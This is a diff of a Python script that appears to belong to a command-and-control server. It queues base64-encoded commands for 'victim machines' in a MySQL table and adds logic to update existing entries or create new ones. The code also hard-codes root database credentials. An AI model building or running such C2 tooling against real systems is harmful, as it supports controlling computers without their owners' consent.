@@ -9,16 +9,13 @@ from mysql.connector import MySQLConnection, Error
 
 def editcommand( id, command ):
 
-	encoded_string = str(base64.b64encode(command.encode('ascii')))
-	ends = re.finditer("'", encoded_string)
-	ends_array = [index.start() for index in ends]
-	new_command = encoded_string[ends_array[0]+1:ends_array[1]]
-
+	#base query to check whether or not the id requested appears in the database
 	query = """ SELECT command, command_output FROM victim_machines WHERE victim_id =%s """
 	data = (id,)
 
 	#https://www.mysqltutorial.org/python-mysql-update/
 	try:
+		#connect to the mysql database
 		connection = MySQLConnection(host='localhost',database='JOB_C2',user='root',password='newpassword',auth_plugin='mysql_native_password')
 		if connection.is_connected():
 			print('Connected to JOB_C2 database')
@@ -27,25 +24,45 @@ def editcommand( id, command ):
 		cursor.execute(query,data)
 		result = cursor.fetchall()
 #		print(result[0][0])
-		old_command = result[0][0]
-		old_command_bytes = old_command.encode('ascii')
-		decoded_old_bytes = base64.b64decode(old_command_bytes)
-		#get the decoded json that was previously being stored in the db
-		decoded_command = '{"1": "blah"}'
 
-		json_data = json.loads(decoded_command)
-		new_command = {str(len(json_data)+1): command}
-		json_data.update(new_command)
-#		print(json.dumps(json_data))
+		if result:
+			print("id found in the database, modifying entry...")
+			#grab old command, decode it, add the new command in json, re-encode it
+			old_command = result[0][0]
+			old_command_bytes = old_command.encode('ascii')
+			decoded_old_bytes = base64.b64decode(old_command_bytes)
+			decoded_command = decoded_old_bytes.decode('ascii')
 
-		json_string = str(json.dumps(json_data))
-		#re-encode the new json which includes the updated command list
-		updated_entry = json_string.encode('ascii')
-		updated_bytes = base64.b64encode(updated_entry)
-		encoded_updated = updated_bytes.decode('ascii')
-#		print(encoded_updated)
+			json_data = json.loads(decoded_command)
+			new_command = {str(len(json_data)+1): command}
+			json_data.update(new_command)
+#			print(json.dumps(json_data))
 
-		#update the database if the row already exists and create a new one if it doesn't
+			json_string = str(json.dumps(json_data))
+			#re-encoding process
+			updated_entry = json_string.encode('ascii')
+			updated_bytes = base64.b64encode(updated_entry)
+			encoded_updated = updated_bytes.decode('ascii')
+#			print(encoded_updated)
+
+			#update the database if the row already exists
+			update_query = """ UPDATE victim_machines SET command=%s WHERE victim_id=%s """
+			update_data = (encoded_updated, id)
+			cursor.execute(update_query, update_data)
+
+		#catch the case in which the victim_id does not exist in the table and create a new entry
+		else:
+			print("id not found in the database")
+			print("creating new entry in database...")
+			empty_command_output = "{}"
+			formatted_command = "{\"1\": \"" + command + "\"}"
+			formatted_ascii = formatted_command.encode('ascii')
+			formatted_bytes = base64.b64encode(formatted_ascii)
+			formatted_encoded = formatted_bytes.decode('ascii')
+			create_query = """ INSERT INTO victim_machines (victim_id, command, command_output) VALUES (%s, %s, %s) """
+			create_data = (id, formatted_encoded,empty_command_output)
+
+			cursor.execute(create_query, create_data)
 
 		connection.commit()
 
@@ -55,23 +72,6 @@ def editcommand( id, command ):
 	finally:
 		cursor.close()
 		connection.close()
-
-#	for i in range(len(data)):
-#		indices = re.finditer(':', data[i])
-#		indices_array = [index.start() for index in indices]
-#		machine_id = re.finditer('=',data[i])
-#		id_array = [index.start() for index in machine_id]
-#		if i > 0 and id == data[i][id_array[0]+1:indices_array[0]]:
-#			print('ID was found!')
-#			location = i
-#			#get the string value of the old command and replace it
-#			old_command = data[location][indices_array[0]+1:indices_array[1]]
-#			commands = json.loads(old_command)
-#			#new_data = data[location].replace(old_command,new_command)
-#			commands.update(new_command)
-#			#set the new command in the data string
-#			data[location] = commands
-#			break
 
 if __name__ == "__main__":
 	editcommand(*sys.argv[1:])
